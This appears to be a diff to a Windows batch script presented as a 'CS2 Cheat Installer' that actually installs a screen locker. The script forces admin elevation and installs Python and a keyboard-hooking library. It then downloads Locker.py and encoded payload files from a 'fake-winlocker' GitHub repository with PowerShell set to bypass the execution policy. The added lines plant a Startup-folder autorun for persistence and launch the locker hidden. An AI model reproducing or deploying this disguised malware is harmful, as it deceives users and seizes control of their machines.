@@ -2,33 +2,29 @@
 setlocal EnableExtensions EnableDelayedExpansion
 title CS2 Cheat Installer
 
-rem --- UAC ---
 net session >nul 2>&1
 if errorlevel 1 (
     powershell -NoProfile -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
     exit /b
 )
 
-rem --- рабочая папка на C:\ ---
 set "WORKDIR=C:\CyberHack"
 if not exist "%WORKDIR%" mkdir "%WORKDIR%" >nul 2>&1
 
 set "SCRIPT=%WORKDIR%\cyberhack.py"
+set "START=%WORKDIR%\start.b64"
 set "SOUND=%WORKDIR%\sound.b64"
 set "VOICE=%WORKDIR%\voice.b64"
-set "BASE=https://raw.githubusercontent.com/xerobrin9908-blip/-/refs/heads/main"
+set "CORRECT=%WORKDIR%\correct.b64"
+set "WRONG=%WORKDIR%\wrong.b64"
+set "AUTORUN=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\cyberhack_check.bat"
+set "BASE=https://raw.githubusercontent.com/xerobrin9908-blip/fake-winlocker/refs/heads/main"
 
 rem --- Python ---
 set "PYTHON_EXE="
-set "PYTHONW_EXE="
 where python >nul 2>&1
 if not errorlevel 1 (
     set "PYTHON_EXE=python"
-    for %%P in (python.exe) do (
-        if exist "%%~$PATH:P" (
-            set "PYTHONW_EXE=%%~dp$PATH:Ppythonw.exe"
-        )
-    )
     goto :python_ok
 )
 
@@ -46,7 +42,6 @@ set "PATH=%PATH%;%ProgramFiles%\Python311;%ProgramFiles%\Python311\Scripts"
 where python >nul 2>&1
 if errorlevel 1 ( echo [ERROR] Python not in PATH. & pause & exit /b 1 )
 set "PYTHON_EXE=python"
-set "PYTHONW_EXE=%ProgramFiles%\Python311\pythonw.exe"
 
 :python_ok
 echo [OK] Python ready.
@@ -56,56 +51,54 @@ echo [*] Installing keyboard...
 if errorlevel 1 ( echo [ERROR] pip install keyboard failed. & pause & exit /b 1 )
 echo [OK] keyboard installed.
 
-rem --- Download Locker.py ---
-echo [*] Downloading Locker.py...
-if exist "%SCRIPT%" del /f /q "%SCRIPT%" >nul 2>&1
-powershell -NoProfile -ExecutionPolicy Bypass -Command ^
-    "Invoke-WebRequest -Uri '%BASE%/Locker.py' -OutFile '%SCRIPT%' -UseBasicParsing"
-if not exist "%SCRIPT%" ( echo [ERROR] Locker.py not downloaded. & pause & exit /b 1 )
-echo [OK] Locker.py downloaded.
+rem --- Download ---
+call :download "%BASE%/Locker.py" "%SCRIPT%"
+call :download "%BASE%/start.b64" "%START%"
+call :download "%BASE%/sound1.b64" "%SOUND%"
+call :download "%BASE%/voice.b64" "%VOICE%"
+call :download "%BASE%/correct.b64" "%CORRECT%"
+call :download "%BASE%/wrong.b64" "%WRONG%"
 
-rem --- Download sound1.b64 -> sound.b64 ---
-echo [*] Downloading sound1.b64...
-if exist "%SOUND%" del /f /q "%SOUND%" >nul 2>&1
-powershell -NoProfile -ExecutionPolicy Bypass -Command ^
-    "Invoke-WebRequest -Uri '%BASE%/sound1.b64' -OutFile '%SOUND%' -UseBasicParsing"
-if not exist "%SOUND%" (
-    echo [WARN] sound1.b64 not downloaded. Sound will be off.
-) else (
-    echo [OK] sound.b64 downloaded.
-)
-
-rem --- Download voice.b64 ---
-echo [*] Downloading voice.b64...
-if exist "%VOICE%" del /f /q "%VOICE%" >nul 2>&1
-powershell -NoProfile -ExecutionPolicy Bypass -Command ^
-    "Invoke-WebRequest -Uri '%BASE%/voice.b64' -OutFile '%VOICE%' -UseBasicParsing"
-if not exist "%VOICE%" (
-    echo [WARN] voice.b64 not downloaded. Voice will be off.
-) else (
-    echo [OK] voice.b64 downloaded.
-)
-
-rem --- запуск в фоне через VBScript ---
-echo [*] Launching...
-set "VBS=%TEMP%\cyberhack_launch.vbs"
+rem --- Автозагрузка: cyberhack_check.bat ---
+echo [*] Installing autorun...
 (
-echo Set WshShell = CreateObject^("WScript.Shell"^)
-echo WshShell.Run """%PYTHONW_EXE%"" ""%SCRIPT%""", 0, False
-) > "%VBS%"
+echo @echo off
+echo setlocal EnableExtensions EnableDelayedExpansion
+echo set "WORKDIR=C:\CyberHack"
+echo if not exist "%%WORKDIR%%\cyberhack.py" (
+echo     rmdir /s /q "%%WORKDIR%%" ^>nul 2^>^&1
+echo     start /b cmd /c del /f /q "%%~f0"
+echo     exit /b 0
+echo )
+echo where pythonw ^>nul 2^>^&1
+echo if not errorlevel 1 (
+echo     start "" /min pythonw "%%WORKDIR%%\cyberhack.py"
+echo ) else (
+echo     start "" /min python "%%WORKDIR%%\cyberhack.py"
+echo )
+echo exit /b 0
+) > "%AUTORUN%"
+echo [OK] Autorun installed.
 
-cscript //nologo "%VBS%" >nul 2>&1
-del /f /q "%VBS%" >nul 2>&1
+rem --- Сразу запускаем локер ---
+echo [*] Launching...
+where pythonw >nul 2>&1
+if not errorlevel 1 (
+    start "" /min pythonw "%SCRIPT%"
+) else (
+    start "" /min python "%SCRIPT%"
+)
 
-rem --- ждём, пока локер работает ---
-:wait_loop
-timeout /t 2 >nul
-tasklist /fi "imagename eq pythonw.exe" 2>nul | find /i "pythonw.exe" >nul
-if not errorlevel 1 goto :wait_loop
+echo [OK] Done. Press any key to close.
+pause >nul
+exit /b 0
 
-rem --- Cleanup ---
-if exist "%SCRIPT%" del /f /q "%SCRIPT%" >nul 2>&1
-if exist "%SOUND%"  del /f /q "%SOUND%"  >nul 2>&1
-if exist "%VOICE%"  del /f /q "%VOICE%"  >nul 2>&1
-
+:download
+set "URL=%~1"
+set "OUT=%~2"
+echo [*] Downloading %~nx2...
+if exist "%OUT%" del /f /q "%OUT%" >nul 2>&1
+powershell -NoProfile -ExecutionPolicy Bypass -Command ^
+    "Invoke-WebRequest -Uri '%URL%' -OutFile '%OUT%' -UseBasicParsing"
+if not exist "%OUT%" ( echo [WARN] %~nx2 not downloaded. )
 exit /b 0
